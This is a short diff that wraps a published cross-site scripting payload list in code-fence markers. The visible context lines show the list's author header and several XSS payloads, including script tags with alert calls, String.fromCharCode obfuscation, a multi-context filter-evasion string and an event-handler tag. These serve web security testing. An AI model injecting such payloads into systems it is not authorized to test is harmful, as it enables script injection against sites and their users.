@@ -1,3 +1,4 @@
+```js
 <!-- Project Name  : Cross Site Scripting ( XSS ) Vulnerability Payload List -->
 <!--        Author : Ismail Tasdelen -->
 <!--      Linkedin : https://www.linkedin.com/in/ismailtasdelen/ -->
@@ -2695,3 +2696,4 @@ foo<script>alert(1)</script>
 <SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>
 ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 <marquee onstart='javascript:alert('1');'>=(◕_◕)=
+```
